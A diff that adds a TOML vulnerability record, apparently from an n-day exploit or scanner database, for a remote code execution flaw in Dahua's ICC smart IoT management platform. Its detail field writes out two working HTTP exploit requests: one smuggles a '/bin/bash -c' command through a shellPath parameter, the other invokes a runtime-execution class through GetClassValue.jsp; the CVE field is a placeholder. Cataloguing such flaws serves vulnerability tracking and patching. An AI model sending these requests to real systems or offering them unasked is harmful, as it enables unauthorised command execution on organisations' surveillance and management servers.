@@ -1,0 +1,17 @@
+vendor = "大华"
+name = "大华智能物联综合管理平台 ICC 多个接口远程代码执行漏洞"
+type = "远程代码执行"
+path = "/evo-runs/v1.0/"
+version = ""
+detail = """POST /evo-runs/v1.0/receive HTTP/1.1 Host: target X-Subject-Headerflag: ADAPT Content-Type: application/json
+
+{"method":"agent.ossm.mapping.config","info":{"configure":"x","filePath":"x","paramMap":{"shellPath":"/bin/bash -c 'id>/tmp/result.txt'","filePath":"x"},"requestIp":""}}
+
+POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1 Host: target Content-Type: application/json
+
+{"data":{"clazzName":"com.dahua.admin.util.RuntimeUtil","methodName":"syncexecReturnInputStream","fieldName":["id"]}}"""
+fix = "联系厂商获取补丁"
+date = 20250601
+label = "nday"
+cve = "TVD-2026-XXXXX"
+verifier = "AdySec"
